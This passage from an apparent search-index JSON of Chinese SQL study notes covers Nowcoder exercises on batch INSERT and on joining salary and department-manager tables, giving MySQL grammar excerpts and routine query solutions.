\u603b\u7ed3"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/INSERT/1.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_34_%E6%89%B9%E9%87%8F%E6%8F%92%E5%85%A5%E6%95%B0%E6%8D%AE/","text":"\u725b\u5ba2\u7f51 SQL\u5b9e\u6218 34 \u6279\u91cf\u63d2\u5165\u6570\u636e # \u76ee\u5f55 # [toc] 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Time Limit # C/C++ 1\u79d2\uff0c\u5176\u4ed6\u8bed\u8a002\u79d2 1.2. Memory Limit # C/C++ 32M\uff0c\u5176\u4ed6\u8bed\u8a0064M 1.3. Problem Description # \u5bf9\u4e8e\u8868actor\u6279\u91cf\u63d2\u5165\u5982\u4e0b\u6570\u636e(\u4e0d\u80fd\u67092\u6761insert\u8bed\u53e5\u54e6!) CREATE TABLEIF NOT EXISTS actor( actor_idsmallint(5)NOT NULL PRIMARY KEY, first_namevarchar(45) NOT NULL, last_namevarchar(45) NOT NULL, last_updatetimestamp NOT NULL DEFAULT (datetime('now','localtime'))) actor_idfirst_namelast_namelast_update1PENELOPEGUINESS2006-02-15 12:34:332NICKWAHLBERG2006-02-15 12:34:33 actor_id first_name last_name last_update 1 PENELOPE GUINESS 2006-02-15 12:34:33 2 NICK WAHLBERG 2006-02-15 12:34:33 1.4. Source # \u725b\u5ba2\u7f51 NC26156 \u6279\u91cf\u63d2\u5165\u6570\u636e 2. \u9898\u89e3 # \u6839\u636e Mysql 8.0 \u5b98\u65b9\u6587\u6863 \uff0c VALUES \u540e\u8ddf\u7684 (value_list) [, (value_list)] ... \u662f\u53ef\u4ee5\u901a\u8fc7\u9017\u53f7\u5206\u9694\u5e76\u5217\u7684\u3002 INSERT [LOW_PRIORITY | DELAYED | HIGH_PRIORITY] [IGNORE] [INTO] tbl_name [PARTITION (partition_name [, partition_name] ...)] [(col_name [, col_name] ...)] { {VALUES | VALUE} (value_list) [, (value_list)] ... | VALUES row_constructor_list } [AS row_alias[(col_alias [, col_alias] ...)]] [ON DUPLICATE KEY UPDATE assignment_list] value: {expr | DEFAULT} value_list: value [, value] ... row_constructor_list: ROW(value_list)[, ROW(value_list)][, ...] assignment: col_name = [row_alias.]value assignment_list: assignment [, assignment] ... 3. \u4ee3\u7801 # INSERT INTO actor VALUES(1, 'PENELOPE', 'GUINESS', '2006-02-15 12:34:33'), (2, 'NICK', 'WAHLBERG', '2006-02-15 12:34:33'); \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"1.\u725b\u5ba2\u7f51 SQL\u5b9e\u6218 34 \u6279\u91cf\u63d2\u5165\u6570\u636e"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/INSERT/1.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_34_%E6%89%B9%E9%87%8F%E6%8F%92%E5%85%A5%E6%95%B0%E6%8D%AE/#sql-34","text":"","title":"\u725b\u5ba2\u7f51 SQL\u5b9e\u6218 34 \u6279\u91cf\u63d2\u5165\u6570\u636e"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/INSERT/1.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_34_%E6%89%B9%E9%87%8F%E6%8F%92%E5%85%A5%E6%95%B0%E6%8D%AE/#_1","text":"[toc]","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/INSERT/1.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_34_%E6%89%B9%E9%87%8F%E6%8F%92%E5%85%A5%E6%95%B0%E6%8D%AE/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/INSERT/1.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_34_%E6%89%B9%E9%87%8F%E6%8F%92%E5%85%A5%E6%95%B0%E6%8D%AE/#11-time-limit","text":"C/C++ 1\u79d2\uff0c\u5176\u4ed6\u8bed\u8a002\u79d2","title":"1.1. Time Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/INSERT/1.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_34_%E6%89%B9%E9%87%8F%E6%8F%92%E5%85%A5%E6%95%B0%E6%8D%AE/#12-memory-limit","text":"C/C++ 32M\uff0c\u5176\u4ed6\u8bed\u8a0064M","title":"1.2. Memory Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/INSERT/1.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_34_%E6%89%B9%E9%87%8F%E6%8F%92%E5%85%A5%E6%95%B0%E6%8D%AE/#13-problem-description","text":"\u5bf9\u4e8e\u8868actor\u6279\u91cf\u63d2\u5165\u5982\u4e0b\u6570\u636e(\u4e0d\u80fd\u67092\u6761insert\u8bed\u53e5\u54e6!) CREATE TABLEIF NOT EXISTS actor( actor_idsmallint(5)NOT NULL PRIMARY KEY, first_namevarchar(45) NOT NULL, last_namevarchar(45) NOT NULL, last_updatetimestamp NOT NULL DEFAULT (datetime('now','localtime'))) actor_idfirst_namelast_namelast_update1PENELOPEGUINESS2006-02-15 12:34:332NICKWAHLBERG2006-02-15 12:34:33 actor_id first_name last_name last_update 1 PENELOPE GUINESS 2006-02-15 12:34:33 2 NICK WAHLBERG 2006-02-15 12:34:33","title":"1.3. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/INSERT/1.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_34_%E6%89%B9%E9%87%8F%E6%8F%92%E5%85%A5%E6%95%B0%E6%8D%AE/#14-source","text":"\u725b\u5ba2\u7f51 NC26156 \u6279\u91cf\u63d2\u5165\u6570\u636e","title":"1.4. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/INSERT/1.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_34_%E6%89%B9%E9%87%8F%E6%8F%92%E5%85%A5%E6%95%B0%E6%8D%AE/#2","text":"\u6839\u636e Mysql 8.0 \u5b98\u65b9\u6587\u6863 \uff0c VALUES \u540e\u8ddf\u7684 (value_list) [, (value_list)] ... \u662f\u53ef\u4ee5\u901a\u8fc7\u9017\u53f7\u5206\u9694\u5e76\u5217\u7684\u3002 INSERT [LOW_PRIORITY | DELAYED | HIGH_PRIORITY] [IGNORE] [INTO] tbl_name [PARTITION (partition_name [, partition_name] ...)] [(col_name [, col_name] ...)] { {VALUES | VALUE} (value_list) [, (value_list)] ... | VALUES row_constructor_list } [AS row_alias[(col_alias [, col_alias] ...)]] [ON DUPLICATE KEY UPDATE assignment_list] value: {expr | DEFAULT} value_list: value [, value] ... row_constructor_list: ROW(value_list)[, ROW(value_list)][, ...] assignment: col_name = [row_alias.]value assignment_list: assignment [, assignment] ...","title":"2. \u9898\u89e3"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/INSERT/1.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_34_%E6%89%B9%E9%87%8F%E6%8F%92%E5%85%A5%E6%95%B0%E6%8D%AE/#3","text":"INSERT INTO actor VALUES(1, 'PENELOPE', 'GUINESS', '2006-02-15 12:34:33'), (2, 'NICK', 'WAHLBERG', '2006-02-15 12:34:33'); \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/JOIN/1.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_3_%E6%9F%A5%E6%89%BE%E5%BD%93%E5%89%8D%E8%96%AA%E6%B0%B4%E8%AF%A6%E6%83%85/","text":"\u725b\u5ba2\u7f51 SQL\u5b9e\u6218 3 \u67e5\u627e\u5f53\u524d\u85aa\u6c34\u8be6\u60c5 # \u76ee\u5f55 # \u725b\u5ba2\u7f51 SQL\u5b9e\u6218 3 \u67e5\u627e\u5f53\u524d\u85aa\u6c34\u8be6\u60c5 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Time Limit 1.2. Memory Limit 1.3. Problem Description 1.4. Output 1.5. Source 2. \u9898\u89e3 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Time Limit # C/C++ 1\u79d2\uff0c\u5176\u4ed6\u8bed\u8a002\u79d2 1.2. Memory Limit # C/C++ 32M\uff0c\u5176\u4ed6\u8bed\u8a0064M 1.3. Problem Description # \u67e5\u627e\u5404\u4e2a\u90e8\u95e8\u5f53\u524d (dept_manager.to_date='9999-01-01') \u9886\u5bfc\u5f53\u524d (salaries.to_date='9999-01-01') \u85aa\u6c34\u8be6\u60c5\u4ee5\u53ca\u5176\u5bf9\u5e94\u90e8\u95e8\u7f16\u53f7 dept_no (\u6ce8:\u8bf7\u4ee5 salaries \u8868\u4e3a\u4e3b\u8868\u8fdb\u884c\u67e5\u8be2\uff0c\u8f93\u51fa\u7ed3\u679c\u4ee5 salaries.emp_no \u5347\u5e8f\u6392\u5e8f\uff0c\u5e76\u4e14\u8bf7\u6ce8\u610f\u8f93\u51fa\u7ed3\u679c\u91cc\u9762 dept_no \u5217\u662f\u6700\u540e\u4e00\u5217) CREATE TABLE `salaries` ( `emp_no` int(11) NOT NULL, -- '\u5458\u5de5\u7f16\u53f7', `salary` int(11) NOT NULL, `from_date` date NOT NULL, `to_date` date NOT NULL, PRIMARY KEY (`emp_no`,`from_date`)); CREATE TABLE `dept_manager` ( `dept_no` char(4) NOT NULL, -- '\u90e8\u95e8\u7f16\u53f7' `emp_no` int(11) NOT NULL, -- '\u5458\u5de5\u7f16\u53f7' `to_date` date NOT NULL, PRIMARY KEY (`emp_no`,`dept_no`)); 1.4. Output # emp_no salary from_date to_date dept_no 10002 72527 2001-08-02 9999-01-01 d001 10004 74057 2001-11-27 9999-01-01 d004 10005 94692 2001-09-09 9999-01-01 d003 10006 43311 2001-08-02 9999-01-01 d002 10010 94409 2001-11-23 9999-01-01 d006 1.5. Source # \u725b\u5ba2\u7f51 SQL\u5b9e\u6218 3 \u67e5\u627e\u5f53\u524d\u85aa\u6c34\u8be6\u60c5 2. \u9898\u89e3 # \u53ef\u4ee5\u4f7f\u7528 JOIN \u67e5\u8be2\uff0c\u4e5f\u53ef\u4ee5\u5728 FROM \u540e\u9762\u63a5\u4e24\u4e2a\u8868\u540d\u5b9e\u73b0 INNER JOIN \u3002 \u6839\u636e Mysql 8.0 \u5b98\u65b9\u6587\u6863 \uff0c FROM \u540e\u8ddf\u7684 table_references \u5c55\u5f00\u4e3a escaped_table_reference [, escaped_table_reference] ... \u662f\u53ef\u4ee5\u901a\u8fc7\u9017\u53f7\u5206\u9694\u5e76\u5217\u7684\uff0c\u540c\u6837\u5b9e\u73b0\u7684\u662f INNER JOIN \u3002 SELECT [ALL | DISTINCT | DISTINCTROW ] [HIGH_PRIORITY] [STRAIGHT_JOIN] [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT] [SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS] select_expr [, select_expr] ... [into_option] [FROM table_references [PARTITION partition_list]] [WHERE where_condition] [GROUP BY {col_name | expr | position}, ... [WITH ROLLUP]] [HAVING where_condition] [WINDOW window_name AS (window_spec) [, window_name AS (window_spec)] ...] [ORDER BY {col_name | expr | position} [ASC | DESC], ... [WITH ROLLUP]] [LIMIT {[offset,] row_count | row_count OFFSET offset}] [into_option] [FOR {UPDATE | SHARE} [OF tbl_name [, tbl_name] ...] [NOWAIT | SKIP LOCKED] | LOCK IN SHARE MODE] [into_option] into_option: { INTO OUTFILE 'file_name' [CHARACTER SET charset_name] export_options | INTO DUMPFILE 'file_name' | INTO var_name [, var_name] ... } table_references: escaped_table_reference [, escaped_table_reference] ... escaped_table_reference: { table_reference | { OJ table_reference } } table_reference: { table_factor | joined_table } table_factor: { tbl_name [PARTITION (partition_names)] [[AS] alias] [index_hint_list] | [LATERAL] table_subquery [AS] alias [(col_list)] | ( table_references ) } 3. \u4ee3\u7801 # \u5148\u8fde\u63a5\u4e24\u4e2a\u8868\uff0c\u5bf9\u4e24\u5f20\u8868\u7684 to_data \u5b57\u6bb5\u90fd\u9700\u8981\u8fdb\u884c\u7b5b\u9009\uff0c\u6700\u540e\u6309\u7167 emp_no \u5347\u5e8f\u6392\u5217\u3002 SELECT t1.*, `dept_no` FROM `salaries` as t1 JOIN `dept_manager` as t2 ON t1.emp_no = t2.emp_no WHERE t1.to_date = '9999-01-01' AND t2.to_date = '9999-01-01' ORDER BY t1.emp_no; \u5728 FROM \u540e\u4f7f\u7528\u9017\u53f7\u5206\u9694\uff0c\u8fde\u63a5\u4e24\u4e2a\u8868\uff0c\u5b9e\u73b0 INNER JOIN \uff0c sqlite \u4e2d\u9700\u8981\u5728\u540e\u9762\u63a5 ON \u3002 SELECT t1.*, `dept_no` FROM `salaries` AS t1, `dept_manager` AS t2 ON t1.emp_no = t2.emp_no WHERE t1.to_date = '9999-01-01' AND t2.to_date = '9999-01-01' ORDER BY t1.emp_no; Mysql \u4e2d\u9700\u8981\u52a0 WHERE \uff0c\u4e0d\u80fd\u52a0 ON \uff0c\u4e0b\u9762\u7684\u8bed\u53e5\u5728 SQLite \u4e2d\u4e5f\u53ef\u4ee5\u8fd0\u884c\u3002 SELECT t1.*, `dept_no` FROM `salaries` as t1, `dept_manager` as t2 WHERE t1.emp_no = t2.emp_no AND t1.to_date = '9999-01-01' AND t2.to_date = '9999-01-01' ORDER BY t1.emp_no; \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"1.\u725b\u5ba2\u7f51 SQL\u5b9e\u6218 3 \u67e5\u627e\u5f53\u524d\u85aa\u6c34\u8be6\u60c5"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/JOIN/1.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_3_%E6%9F%A5%E6%89%BE%E5%BD%93%E5%89%8D%E8%96%AA%E6%B0%B4%E8%AF%A6%E6%83%85/#sql-3","text":"","title":"\u725b\u5ba2\u7f51 SQL\u5b9e\u6218 3 \u67e5\u627e\u5f53\u524d\u85aa\u6c34\u8be6\u60c5"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/JOIN/1.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_3_%E6%9F%A5%E6%89%BE%E5%BD%93%E5%89%8D%E8%96%AA%E6%B0%B4%E8%AF%A6%E6%83%85/#_1","text":"\u725b\u5ba2\u7f51 SQL\u5b9e\u6218 3 \u67e5\u627e\u5f53\u524d\u85aa\u6c34\u8be6\u60c5 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Time Limit 1.2. Memory Limit 1.3. Problem Description 1.4. Output 1.5. Source 2. \u9898\u89e3 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/JOIN/1.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_3_%E6%9F%A5%E6%89%BE%E5%BD%93%E5%89%8D%E8%96%AA%E6%B0%B4%E8%AF%A6%E6%83%85/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/JOIN/1.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_3_%E6%9F%A5%E6%89%BE%E5%BD%93%E5%89%8D%E8%96%AA%E6%B0%B4%E8%AF%A6%E6%83%85/#11-time-limit","text":"C/C++ 1\u79d2\uff0c\u5176\u4ed6\u8bed\u8a002\u79d2","title":"1.1. Time Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/JOIN/1.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_3_%E6%9F%A5%E6%89%BE%E5%BD%93%E5%89%8D%E8%96%AA%E6%B0%B4%E8%AF%A6%E6%83%85/#12-memory-limit","text":"C/C++ 32M\uff0c\u5176\u4ed6\u8bed\u8a0064M","title":"1.2. Memory Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/JOIN/1.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_3_%E6%9F%A5%E6%89%BE%E5%BD%93%E5%89%8D%E8%96%AA%E6%B0%B4%E8%AF%A6%E6%83%85/#13-problem-description","text":"\u67e5\u627e\u5404\u4e2a\u90e8\u95e8\u5f53\u524d (dept_manager.to_date='9999-01-01') \u9886\u5bfc\u5f53\u524d (salaries.to_date='9999-01-01') \u85aa\u6c34\u8be6\u60c5\u4ee5\u53ca\u5176\u5bf9\u5e94\u90e8\u95e8\u7f16\u53f7 dept_no (\u6ce8:\u8bf7\u4ee5 salaries \u8868\u4e3a\u4e3b\u8868\u8fdb\u884c\u67e5\u8be2\uff0c\u8f93\u51fa\u7ed3\u679c\u4ee5 salaries.emp_no \u5347\u5e8f\u6392\u5e8f\uff0c\u5e76\u4e14\u8bf7\u6ce8\u610f\u8f93\u51fa\u7ed3\u679c\u91cc\u9762 dept_no \u5217\u662f\u6700\u540e\u4e00\u5217) CREATE TABLE `salaries` ( `emp_no` int(11) NOT NULL, -- '\u5458\u5de5\u7f16\u53f7', `salary` int(11) NOT NULL, `from_date` date NOT NULL, `to_date` date NOT NULL, PRIMARY KEY (`emp_no`,`from_date`)); CREATE TABLE `dept_manager` ( `dept_no` char(4) NOT NULL, -- '\u90e8\u95e8\u7f16\u53f7' `emp_no` int(11) NOT NULL, -- '\u5458\u5de5\u7f16\u53f7' `to_date` date NOT NULL, PRIMARY KEY (`emp_no`,`dept_no`));","title":"1.3. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/JOIN/1.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_3_%E6%9F%A5%E6%89%BE%E5%BD%93%E5%89%8D%E8%96%AA%E6%B0%B4%E8%AF%A6%E6%83%85/#14-output","text":"emp_no salary from_date to_date dept_no 10002 72527 2001-08-02 9999-01-01 d001 10004 74057 2001-11-27 9999-01-01 d004 10005 94692 2001-09-09 9999-01-01 d003 10006 43311 2001-08-02 9999-01-01 d002 10010 94409 2001-11-23 9999-01-01 d006","title":"1.4. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/JOIN/1.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_3_%E6%9F%A5%E6%89%BE%E5%BD%93%E5%89%8D%E8%96%AA%E6%B0%B4%E8%AF%A6%E6%83%85/#15-source","text":"\u725b\u5ba2\u7f51 SQL\u5b9e\u6218 3 \u67e5\u627e\u5f53\u524d\u85aa\u6c34\u8be6\u60c5","title":"1.5. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/JOIN/1.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_3_%E6%9F%A5%E6%89%BE%E5%BD%93%E5%89%8D%E8%96%AA%E6%B0%B4%E8%AF%A6%E6%83%85/#2","text":"\u53ef\u4ee5\u4f7f\u7528 JOIN \u67e5\u8be2\uff0c\u4e5f\u53ef\u4ee5\u5728 FROM \u540e\u9762\u63a5\u4e24\u4e2a\u8868\u540d\u5b9e\u73b0 INNER JOIN \u3002 \u6839\u636e Mysql 8.0 \u5b98\u65b9\u6587\u6863 \uff0c FROM \u540e\u8ddf\u7684 table_references \u5c55\u5f00\u4e3a escaped_table_reference [, escaped_table_reference] ... \u662f\u53ef\u4ee5\u901a\u8fc7\u9017\u53f7\u5206\u9694\u5e76\u5217\u7684\uff0c\u540c\u6837\u5b9e\u73b0\u7684\u662f INNER JOIN \u3002 SELECT [ALL | DISTINCT | DISTINCTROW ] [HIGH_PRIORITY] [STRAIGHT_JOIN] [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT] [SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS] select_expr [, select_expr] ... [into_option] [FROM table_references [PARTITION partition_list]] [WHERE where_condition] [GROUP BY {col_name | expr | position}, ... [WITH ROLLUP]] [HAVING where_condition] [WINDOW window_name AS (window_spec) [, window_name AS (window_spec)] ...] [ORDER BY {col_name | expr | position} [ASC | DESC], ... [WITH ROLLUP]] [LIMIT {[offset,] row_count | row_count OFFSET offset}] [into_option] [FOR {UPDATE | SHARE} [OF tbl_name [, tbl_name] ...] [NOWAIT | SKIP LOCKED] | LOCK IN SHARE MODE] [into_option] into_option: { INTO OUTFILE 'file_name' [CHARACTER SET charset_name] export_options | INTO DUMPFILE 'file_name' | INTO var_name [, var_name] ... } table_references: escaped_table_reference [, escaped_table_reference] ... escaped_table_reference: { table_reference | { OJ table_reference } } table_reference: { table_factor | joined_table } table_factor: { tbl_name [PARTITION (partition_names)] [[AS] alias] [index_hint_list] | [LATERAL] table_subquery [AS] alias [(col_list)] | ( table_references ) }","title":"2. \u9898\u89e3"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/JOIN/1.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_3_%E6%9F%A5%E6%89%BE%E5%BD%93%E5%89%8D%E8%96%AA%E6%B0%B4%E8%AF%A6%E6%83%85/#3","text":"\u5148\u8fde\u63a5\u4e24\u4e2a\u8868\uff0c\u5bf9\u4e24\u5f20\u8868\u7684 to_data \u5b57\u6bb5\u90fd\u9700\u8981\u8fdb\u884c\u7b5b\u9009\uff0c\u6700\u540e\u6309\u7167 emp_no \u5347\u5e8f\u6392\u5217\u3002 SELECT t1.*, `dept_no` FROM `salaries` as t1 JOIN `dept_manager` as t2 ON t1.emp_no = t2.emp_no WHERE t1.to_date = '9999-01-01' AND t2.to_date = '9999-01-01' ORDER BY t1.emp_no; \u5728 FROM \u540e\u4f7f\u7528\u9017\u53f7\u5206\u9694\uff0c\u8fde\u63a5\u4e24\u4e2a\u8868\uff0c\u5b9e\u73b0 INNER JOIN \uff0c sqlite \u4e2d\u9700\u8981\u5728\u540e\u9762\u63a5 ON \u3002 SELECT t1.*, `dept_no` FROM `salaries` AS t1, `dept_manager` AS t2 ON t1.emp_no = t2.emp_no WHERE t1.to_date = '9999-01-01' AND t2.to_date = '9999-01-01' ORDER BY t1.emp_no; Mysql \u4e2d\u9700\u8981\u52a0 WHERE \uff0c\u4e0d\u80fd\u52a0 ON \uff0c\u4e0b\u9762\u7684\u8bed\u53e5\u5728 SQLite \u4e2d\u4e5f\u53ef\u4ee5\u8fd0\u884c\u3002 SELECT t1.*, `dept_no` FROM `salaries` as t1, `dept_manager` as t2 WHERE t1.emp_no = t2.emp_no AND t1.to_date = '9999-01-01' AND t2.to_date = '9999-01-01' ORDER BY t1.emp_no; \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/JOIN/2.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_4_%E6%9F%A5%E6%89%BE%E6%89%80%E6%9C%89%E5%B7%B2%E7%BB%8F%E5%88%86%E9%85%8D%E9%83%A8%E9%97%A8%E7%9A%84%E5%91%98%E5%B7%A5/","text":"\u725b\u5ba2\u7f51 SQL\u5b9e\u6218 4 \u67e5\u627e\u6240\u6709\u5df2\u7ecf\u5206\u914d\u90e8\u95e8\u7684\u5458\u5de5 # \u76ee\u5f55 # \u725b\u5ba2\u7f51 SQL\u5b9e\u6218 4 \u67e5\u627e\u6240\u6709\u5df2\u7ecf\u5206\u914d\u90e8\u95e8\u7684\u5458\u5de5 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Time Limit 1.2. Memory Limit 1.3. Problem Description 1.4. Output 1.5. Source 2. \u9898\u89e3 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Time Limit # C/C++ 1\u79d2\uff0c\u5176\u4ed6\u8bed\u8a002\u79d2 1.2. Memory Limit # C/C++ 32M\uff0c\u5176\u4ed6\u8bed\u8a0064M 1.3. Problem Description # \u67e5\u627e\u6240\u6709\u5df2\u7ecf\u5206\u914d\u90e8\u95e8\u7684\u5458\u5de5\u7684last_name\u548cfirst_name\u4ee5\u53cadept_no(\u8bf7\u6ce8\u610f\u8f93\u51fa\u63cf\u8ff0\u91cc\u5404\u4e2a\u5217\u7684\u524d\u540e\u987a\u5e8f) CREATE TABLE `dept_emp` ( `emp_no` int(11) NOT NULL, `dept_no` char(4) NOT NULL, `from_date` date NOT NULL, `to_date` date NOT NULL, PRIMARY KEY (`emp_no`,`dept_no`)); CREATE TABLE `employees` ( `emp_no` int(11) NOT NULL, `birth_date` date NOT NULL, `first_name` varchar(14) NOT NULL, `last_name` varchar(16) NOT NULL, `gender` char(1) 